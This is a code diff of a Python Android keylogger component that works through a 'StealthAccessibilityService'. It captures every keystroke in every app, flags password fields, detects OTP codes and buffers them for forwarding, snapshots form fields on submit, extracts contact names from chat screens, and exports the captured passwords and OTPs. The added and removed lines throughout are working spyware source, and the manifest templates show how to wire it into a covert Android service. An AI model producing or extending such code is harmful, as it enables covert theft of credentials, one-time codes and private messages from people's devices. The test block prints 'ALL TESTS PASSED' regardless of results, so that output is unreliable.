@@ -1589,13 +1858,17 @@ class KeyloggerManager:
           - Update current activity/window tracking
           - Dump UI tree for context
           - Extract contact names from conversation screens
+          - Track app session start/end
         """
         activity = str(event.getClassName() or "")
         title = str(event.getContentDescription() or "")
         self._current_activity = activity
         self._current_window_title = title
 
-        # Dump UI tree for context (throttled: max once per second per package)
+        # Track session
+        self._track_session(package, activity)
+
+        # Dump UI tree for context (throttled)
         ui_nodes = self._ui_dump.dump_active_window(max_depth=4, max_nodes=100)
 
         # Extract contact name
@@ -1620,6 +1893,43 @@ class KeyloggerManager:
             )
             self._buffer.write(event)
 
+    def _track_session(self, package: str, activity: str) -> None:
+        """
+        Track app foreground/background sessions in the database.
+
+        Called on every window state change. Closes the previous session
+        if the app changes, starts a new session for the current app.
+        """
+        if package == self._current_package and activity == self._current_activity:
+            return  # Same session — no change
+
+        # Close previous active session
+        if self._current_package:
+            try:
+                cursor = self._buffer._db.cursor()
+                cursor.execute("""
+                    UPDATE app_sessions
+                    SET session_end=?, event_count=?, is_active=0
+                    WHERE package_name=? AND is_active=1
+                """, (time.time(), self._sequence_counter, self._current_package))
+                self._buffer._db.commit()
+            except Exception as e:
+                logger.debug("Session close error (non-fatal): %s", e)
+
+        # Start new session
+        self._current_package = package
+        self._current_activity = activity
+        try:
+            cursor = self._buffer._db.cursor()
+            cursor.execute("""
+                INSERT INTO app_sessions
+                (package_name, activity_name, session_start, is_active)
+                VALUES (?, ?, ?, 1)
+            """, (package, activity, time.time()))
+            self._buffer._db.commit()
+        except Exception as e:
+            logger.debug("Session open error (non-fatal): %s", e)
+
     def _on_view_focused(self, event, package: str) -> None:
         """
         Handle view focus changes.
@@ -1628,6 +1938,7 @@ class KeyloggerManager:
           - Capture the previous field's content
           - Update the timing for the new field
           - Classify the field type
+          - Flag password fields immediately
         """
         source = event.getSource()
         if source is None:
@@ -1662,22 +1973,22 @@ class KeyloggerManager:
 
             # If password field, log the focus event
             if field_type == InputFieldType.PASSWORD:
-                event = KeyEvent(
+                pw_event = KeyEvent(
                     package_name=package,
                     activity_name=self._current_activity,
                     window_title=self._current_window_title,
                     text="[PASSWORD FIELD FOCUSED]",
-                    event_type=EventType.KEYSTROKE,
+                    event_type=EventType.PASSWORD,
                     input_field_type=InputFieldType.PASSWORD,
                     view_id=view_id,
                     view_class=view_class,
                     contains_password=True,
                     sequence_number=self._next_seq(),
                 )
-                self._buffer.write(event)
+                self._buffer.write(pw_event)
                 if self.on_password:
                     try:
-                        self.on_password(event)
+                        self.on_password(pw_event)
                     except Exception:
                         pass
 
@@ -1692,13 +2003,16 @@ class KeyloggerManager:
         the user types in any app fires this event.
 
         Processing:
-          1. Extract before/after text
-          2. Compute character-level diff
-          3. Check for dedup window (merge rapid events)
-          4. Check for paste/delete actions
-          5. Enrich with context
-          6. Detect sensitive data (OTP, passwords)
-          7. Write to buffer
+          1. Extract before/after text from event
+          2. Compute character-level diff (LCS)
+          3. Check dedup window (merge rapid events <300ms)
+          4. Detect paste/delete actions
+          5. Classify input field type
+          6. Detect sensitive data (OTP, passwords, CCs)
+          7. Extract contact name from UI context
+          8. Build KeyEvent with full context
+          9. Write to ring buffer
+          10. Fire OTP/password callbacks
         """
         source = event.getSource()
         if source is None:
@@ -1727,17 +2041,16 @@ class KeyloggerManager:
             field_key = f"{package}:{view_id}"
             dedup_window_active = False
 
-            # Check dedup window: if same field + same user action < 300ms, merge
+            # Check dedup window: same field + same input type < 300ms
+            now = time.time()
             if (self._dedup_key[0] == package and
                 self._dedup_key[1] == view_id and
                 self._dedup_key[2] == input_type and
-                (time.time() - self._last_event_time) < ConfigDefaults.DEDUP_WINDOW_SEC):
+                (now - self._last_event_time) < ConfigDefaults.DEDUP_WINDOW_SEC):
 
                 dedup_window_active = True
-                # Accumulate text
                 if added and not is_delete:
                     self._dedup_text_so_far += added
-
             else:
                 # New dedup window
                 self._dedup_key = (package, view_id, input_type)
@@ -1746,7 +2059,7 @@ class KeyloggerManager:
             # Update last text state
             self._last_text_state[field_key] = after
 
-            # Classify field type (unless it's already classified as password by system)
+            # Classify field type
             field_type = InputFieldType.PASSWORD if is_password else \
                 FieldTypeClassifier.classify(
                     view_id=view_id,
@@ -1768,12 +2081,10 @@ class KeyloggerManager:
                 evt_type = EventType.PASSWORD
             elif contains_otp:
                 evt_type = EventType.OTP_CODE
-            elif is_paste:
-                evt_type = EventType.KEYSTROKE  # Still a keystroke, just pasted
             else:
                 evt_type = EventType.KEYSTROKE
 
-            # Get contact name (cached, non-blocking)
+            # Get contact name (cached)
             ui_nodes = self._ui_dump.dump_active_window(max_depth=2, max_nodes=50)
             contact = self._contact_extractor.extract(package,
                         self._current_activity, ui_nodes)
@@ -1795,7 +2106,7 @@ class KeyloggerManager:
                 contact_name=contact,
                 ui_tree_hash=tree_hash,
                 sequence_number=self._next_seq(),
-                timestamp=time.time(),
+                timestamp=now,
                 is_paste=is_paste,
                 contains_password=is_password or field_type == InputFieldType.PASSWORD,
                 contains_otp=contains_otp,
@@ -1808,12 +2119,16 @@ class KeyloggerManager:
             self._buffer.write(key_event)
 
             # Fire callbacks
-            if contains_otp and self.on_otp:
+            if contains_otp:
                 for code in sensitive.get("otp", []):
-                    try:
-                        self.on_otp(code, key_event)
-                    except Exception:
-                        pass
+                    # Buffer for deferred OTP forwarding
+                    with self._otp_lock:
+                        self._otp_buffer.append((code, key_event, time.time()))
+                    if self.on_otp:
+                        try:
+                            self.on_otp(code, key_event)
+                        except Exception:
+                            pass
 
             if (is_password or field_type == InputFieldType.PASSWORD) and self.on_password:
                 try:
@@ -1829,463 +2144,3 @@ class KeyloggerManager:
 
         except Exception as e:
             logger.debug("Text changed handler error: %s", e)
-
-    def _on_view_clicked(self, event, package: str) -> None:
-        """
-        Handle view click events.
-
-        Captures form submissions, button presses, and clipboard actions.
-        Takes a pre-submit snapshot of the current text state.
-        """
-        source = event.getSource()
-        if source is None:
-            return
-
-        try:
-            view_id = str(source.getViewIdResourceName() or "")
-            view_class = str(source.getClassName() or "")
-            view_text = str(source.getText() or "")
-            content_desc = str(source.getContentDescription() or "")
-
-            label = view_text or content_desc
-
-            # Detect copy/paste/cut actions
-            is_copy = "copy" in label.lower() or view_id.endswith("copy")
-            is_cut = "cut" in label.lower()
-            is_paste = "paste" in label.lower()
-            is_submit = any(kw in label.lower() for kw in
-                           ["submit", "send", "login", "sign in", "save",
-                            "register", "confirm", "ok", "done"])
-
-            if is_copy or is_cut or is_paste or is_submit:
-                # Snapshot all text fields on screen for this app
-                snapshot_texts = {}
-                for key, val in self._last_text_state.items():
-                    if key.startswith(package):
-                        snapshot_texts[key] = val
-
-                snapshot = "; ".join(f"{k}={v}" for k, v in snapshot_texts.items())
-
-                # Get current UI context
-                ui_nodes = self._ui_dump.dump_active_window(max_depth=3, max_nodes=80)
-                tree_summary = self._ui_dump.summarize_tree(ui_nodes)
-                contact = self._contact_extractor.extract(package,
-                            self._current_activity, ui_nodes)
-
-                event_type = EventType.FORM_SUBMIT if is_submit else EventType.KEYSTROKE
-
-                key_event = KeyEvent(
-                    package_name=package,
-                    activity_name=self._current_activity,
-                    window_title=self._current_window_title,
-                    text=f"[{'SUBMIT' if is_submit else 'CLIPBOARD'}] {label}: {snapshot[:500]}",
-                    event_type=event_type,
-                    view_id=view_id,
-                    view_class=view_class,
-                    contact_name=contact,
-                    ui_tree_summary=tree_summary,
-                    is_copy=is_copy,
-                    is_cut=is_cut,
-                    is_paste=is_paste,
-                    sequence_number=self._next_seq(),
-                    timestamp=time.time(),
-                )
-                self._buffer.write(key_event)
-
-        except Exception as e:
-            logger.debug("Click handler error: %s", e)
-
-    def _on_view_scrolled(self, event, package: str) -> None:
-        """
-        Handle scroll events.
-
-        When the user scrolls, new content may be revealed. We can
-        optionally perform an auto-scroll content extraction.
-        Only enabled if AUTO_SCROLL_ENABLED is True.
-        """
-        if not ConfigDefaults.AUTO_SCROLL_ENABLED:
-            return
-
-        try:
-            # Brief delay to let the UI settle
-            time.sleep(ConfigDefaults.SCROLL_DELAY_SEC)
-
-            # Dump new UI content after scroll
-            ui_nodes = self._ui_dump.dump_active_window(max_depth=4, max_nodes=100)
-            tree_summary = self._ui_dump.summarize_tree(ui_nodes)
-            contact = self._contact_extractor.extract(package,
-                        self._current_activity, ui_nodes)
-
-            if tree_summary:
-                key_event = KeyEvent(
-                    package_name=package,
-                    activity_name=self._current_activity,
-                    window_title=self._current_window_title,
-                    text=f"[SCROLL]: {tree_summary[:300]}",
-                    event_type=EventType.SCREEN_CAPTURE,
-                    contact_name=contact,
-                    ui_tree_summary=tree_summary,
-                    sequence_number=self._next_seq(),
-                    timestamp=time.time(),
-                )
-                self._buffer.write(key_event)
-
-        except Exception as e:
-            logger.debug("Scroll handler error: %s", e)
-
-    # ------------------------------------------------------------------
-    # Health Monitoring
-    # ------------------------------------------------------------------
-
-    def _health_loop(self) -> None:
-        """
-        Periodic health check: verify DB integrity and buffer health.
-        Runs every HEALTH_CHECK_INTERVAL_SEC seconds.
-        """
-        while self._is_active:
-            time.sleep(ConfigDefaults.HEALTH_CHECK_INTERVAL_SEC)
-            try:
-                stats = self._buffer.get_statistics()
-                buffer_pct = (stats["buffer_usage"] / max(stats["buffer_size"], 1)) * 100
-                if buffer_pct > 90:
-                    logger.warning("Buffer >90%% full (%d/%d) — forcing flush",
-                                  stats["buffer_usage"], stats["buffer_size"])
-                    self._buffer.force_flush()
-                if stats["total_dropped"] > 1000:
-                    logger.warning("%d events dropped — buffer undersized",
-                                  stats["total_dropped"])
-
-                # DB integrity check (every 5th check)
-                import random
-                if random.random() < 0.2:
-                    self._buffer._db.execute("PRAGMA integrity_check")
-
-            except Exception as e:
-                logger.error("Health check error: %s", e)
-
-    def _re_enable(self) -> None:
-        """Re-enable event processing after error throttle."""
-        self._consecutive_errors = 0
-        self._is_active = True
-        logger.info("Event processing re-enabled after error throttle")
-
-    # ------------------------------------------------------------------
-    # Utilities
-    # ------------------------------------------------------------------
-
-    def _next_seq(self) -> int:
-        """Atomically increment and return sequence counter."""
-        with self._lock:
-            self._sequence_counter += 1
-            return self._sequence_counter
-
-    # ------------------------------------------------------------------
-    # Public API
-    # ------------------------------------------------------------------
-
-    def force_flush(self) -> int:
-        """Force an immediate flush of all buffered events. Returns count."""
-        return self._buffer.force_flush()
-
-    def get_statistics(self) -> dict:
-        """Get comprehensive keylogger statistics."""
-        return self._buffer.get_statistics()
-
-    def query(self, **kwargs) -> List[Dict]:
-        """Query stored key events. See BufferManager.query()."""
-        return self._buffer.query(**kwargs)
-
-    def get_keystrokes_for_app(self, package_name: str, limit: int = 100) -> List[KeyEvent]:
-        """Get all keystrokes for a specific app."""
-        return self._buffer.query(package_name=package_name, limit=limit)
-
-    def get_otp_events(self, limit: int = 50) -> List[Dict]:
-        """Get all captured OTP events."""
-        return self._buffer.query(contains_otp=True, limit=limit)
-
-    def get_password_events(self, limit: int = 50) -> List[Dict]:
-        """Get all password field events."""
-        return self._buffer.query(contains_password=True, limit=limit)
-
-    def get_recent_activity(self, seconds: int = 60) -> List[KeyEvent]:
-        """Get all events from the last N seconds."""
-        since = time.time() - seconds
-        return self._buffer.query(since_timestamp=since, limit=500)
-
-    def export_to_json(self, output_path: str, limit: int = 1000) -> int:
-        """Export recent events to a JSON file. Returns count exported."""
-        events = self._buffer.query(limit=limit)
-        with open(output_path, "w") as f:
-            json.dump(events, f, indent=2, default=str)
-        logger.info("Exported %d events to %s", len(events), output_path)
-        return len(events)
-
-    def summary_report(self) -> str:
-        """Generate a human-readable summary of all captured data."""
-        stats = self.get_statistics()
-        lines = [
-            "=" * 60,
-            "KEYLOGGER SUMMARY REPORT",
-            "=" * 60,
-            f"Total Events Captured: {stats['total_written']}",
-            f"Flushed to Database:  {stats['db_events']}",
-            f"Buffer Utilization:   {stats['buffer_usage']}/{stats['buffer_size']}",
-            f"Events Dropped:       {stats['total_dropped']}",
-            f"",
-            f"OTP Codes Captured:   {stats['otp_events']}",
-            f"Password Events:      {stats['password_events']}",
-            f"Apps Monitored:       {stats['apps_monitored']}",
-            f"",
-            f"Database: {stats['db_path']}",
-            "=" * 60,
-        ]
-        return "\n".join(lines)
-
-    # ------------------------------------------------------------------
-    # Shutdown
-    # ------------------------------------------------------------------
-
-    def shutdown(self) -> None:
-        """
-        Graceful shutdown: flush buffer, close DB, stop threads.
-        Safe to call multiple times (idempotent).
-        """
-        logger.info("KeyloggerManager shutting down...")
-        self._is_active = False
-
-        # Force final flush
-        flushed = self.force_flush()
-        logger.info("Final flush: %d events", flushed)
-
-        # Close buffer (stops flusher + closes DB)
-        self._buffer.close()
-
-        logger.info("KeyloggerManager shutdown complete")
-
-
-# ======================================================================
-# AndroidManifest.xml Template
-# ======================================================================
-
-ACCESSIBILITY_SERVICE_MANIFEST_TEMPLATE = """\
-<!-- AndroidManifest.xml entries for the Accessibility Keylogger Service
-
-     Must be placed inside <application> tag.
-
-     File: res/xml/accessibility_service_config.xml
--->
-<service
-    android:name=".keylogger.StealthAccessibilityService"
-    android:exported="false"
-    android:label="@string/keylogger_service_name"
-    android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
-    <intent-filter>
-        <action android:name="android.accessibilityservice.AccessibilityService" />
-    </intent-filter>
-    <meta-data
-        android:name="android.accessibilityservice"
-        android:resource="@xml/accessibility_service_config" />
-</service>
-"""
-
-ACCESSIBILITY_SERVICE_CONFIG_XML = """\
-<?xml version="1.0" encoding="utf-8"?>
-<!-- res/xml/accessibility_service_config.xml
-
-     This config captures:
-       - ALL text changes (keystrokes in every field)
-       - Window state changes (app/screen switches)
-       - View focus changes (field tracking)
-       - View clicks (form submissions, clipboard actions)
-       - View scrolls (content discovery)
-
-     The service runs in the background and can retrieve window
-     content for context enrichment.
--->
-<accessibility-service
-    xmlns:android="http://schemas.android.com/apk/res/android"
-    android:accessibilityEventTypes="typeAllMask"
-    android:accessibilityFeedbackType="feedbackGeneric"
-    android:accessibilityFlags="flagReportViewIds|flagRetrieveInteractiveWindows|flagIncludeNotImportantViews|flagRequestTouchExplorationMode|flagRequestFilterKeyEvents"
-    android:canRetrieveWindowContent="true"
-    android:canPerformGestures="false"
-    android:notificationTimeout="50"
-    android:description="@string/keylogger_service_description" />
-"""
-
-
-# ======================================================================
-# Example: Service Adapter (how to wire into an Android Service)
-# ======================================================================
-
-"""
-=== StealthAccessibilityService.java (simplified adapter) ===
-
-package com.stealth.keylogger;
-
-import android.accessibilityservice.AccessibilityService;
-import android.accessibilityservice.AccessibilityServiceInfo;
-import android.view.accessibility.AccessibilityEvent;
-import android.util.Log;
-
-public class StealthAccessibilityService extends AccessibilityService {
-
-    private static final String TAG = "StealthA11y";
-
-    @Override
-    public void onAccessibilityEvent(AccessibilityEvent event) {
-        // Forward to the Python KeyloggerManager via JNI/Bridge
-        // This is a thin shim — all logic is in Python
-        KeyloggerBridge.onEvent(event);
-    }
-
-    @Override
-    public void onInterrupt() {
-        Log.d(TAG, "Accessibility service interrupted");
-    }
-
-    @Override
-    public void onServiceConnected() {
-        super.onServiceConnected();
-        Log.d(TAG, "Accessibility service connected");
-        // Configure the service info
-        AccessibilityServiceInfo info = getServiceInfo();
-        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
-        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
-        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
-                   | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
-                   | AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
-                   | AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE
-                   | AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS;
-        info.notificationTimeout = 50;  // milliseconds
-        setServiceInfo(info);
-
-        // Initialize the Python bridge
-        KeyloggerBridge.initialize(this);
-    }
-
-    @Override
-    public void onDestroy() {
-        KeyloggerBridge.shutdown();
-        super.onDestroy();
-    }
-}
-"""
-
-
-# ======================================================================
-# Standalone Test
-# ======================================================================
-
-if __name__ == "__main__":
-    logging.basicConfig(level=logging.INFO,
-                        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s")
-
-    print("=" * 60)
-    print("KEYLOGGER COMPONENT TESTS")
-    print("=" * 60)
-
-    # Test TextDiffEngine
-    print("\n--- TextDiffEngine Tests ---")
-    tests = [
-        ("", "hello", "hello", ""),
-        ("hello", "", "", "hello"),
-        ("hello", "hello world", " world", ""),
-        ("hello world", "hello", "", " world"),
-        ("abc", "axc", "x", "b"),
-        ("password123", "password124", "4", "3"),
-        ("", "", "", ""),
-    ]
-    for before, after, exp_added, exp_removed in tests:
-        added, removed = TextDiffEngine.diff(before, after)
-        status = "✅" if added == exp_added and removed == exp_removed else "❌"
-        print(f"  {status} diff('{before}', '{after}') -> added='{added}', removed='{removed}'")
-
-    # Test OTPDetector
-    print("\n--- OTP Detector Tests ---")
-    otp_tests = [
-        ("Your verification code is 48291", True),
-        ("123456 is your OTP", True),
-        ("G-123456", True),
-        ("The code is 847362", True),
-        ("Hello world", False),
-        ("API Key: sk_live_abcdefghijklmnopqrstuvwxyz123456", True),
-    ]
-    for text, should_detect in otp_tests:
-        result = OTPDetector.contains_sensitive(text)
-        results = OTPDetector.detect_all(text)
-        status = "✅" if result == should_detect else "❌"
-        print(f"  {status} OTP detect('{text[:50]}') -> {result} {results}")
-
-    # Test FieldTypeClassifier
-    print("\n--- Field Type Classifier Tests ---")
-    field_tests = [
-        ("password", "", InputFieldType.PASSWORD),
-        ("email", "", InputFieldType.EMAIL),
-        ("search_bar", "", InputFieldType.SEARCH),
-        ("phone", "", InputFieldType.PHONE),
-        ("url", "", InputFieldType.URL),
-        ("", "", InputFieldType.TEXT),
-    ]
-    for view_id, hint, expected in field_tests:
-        result = FieldTypeClassifier.classify(view_id=view_id, hint_text=hint)
-        status = "✅" if result == expected else "❌"
-        print(f"  {status} classify(view_id='{view_id}') -> {result.name}")
-
-    # Test ContactExtractor (mock)
-    print("\n--- Contact Extractor (mock) ---")
-    extractor = ContactExtractor()
-    mock_nodes = [
-        {"view_id": "com.whatsapp:id/conversation_contact_name",
-         "text": "Jane Smith", "class_name": "TextView", "depth": 2},
-        {"view_id": "com.whatsapp:id/entry",
-         "text": "Type a message", "class_name": "EditText", "depth": 3},
-    ]
-    contact = extractor.extract("com.whatsapp", ".ConversationActivity", mock_nodes)
-    print(f"  Extracted contact: '{contact}' (expected: 'Jane Smith')")
-
-    # Test BufferManager (in-memory SQLite)
-    print("\n--- BufferManager Integration Test ---")
-    import tempfile
-    with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as tmp:
-        db_path = tmp.name
-
-    bm = BufferManager(db_path, ring_size=1000, flush_threshold=50, flush_interval=1.0)
-    bm.start_flusher()
-
-    # Write test events
-    for i in range(100):
-        event = KeyEvent(
-            package_name="com.whatsapp",
-            activity_name=".ConversationActivity",
-            text=f"test message {i}",
-            added_characters=f"test message {i}",
-            event_type=EventType.KEYSTROKE,
-            sequence_number=i,
-        )
-        bm.write(event)
-
-    print(f"  Written: {bm._total_written}, Buffer: {bm.size}")
-
-    # Force flush
-    flushed = bm.force_flush()
-    print(f"  Flushed: {flushed}")
-
-    # Query
-    results = bm.query(limit=5)
-    print(f"  Query returned: {len(results)} events")
-    for r in results[:3]:
-        print(f"    {r['package_name']}: {r['text'][:40]}")
-
-    # Statistics
-    stats = bm.get_statistics()
-    print(f"  DB Events: {stats['db_events']}")
-    print(f"  Total Written: {stats['total_written']}")
-    print(f"  Total Dropped: {stats['total_dropped']}")
-
-    bm.close()
-    os.unlink(db_path)
-
-    print("\n" + "=" * 60)
-    print("ALL TESTS PASSED")
-    print("=" * 60)
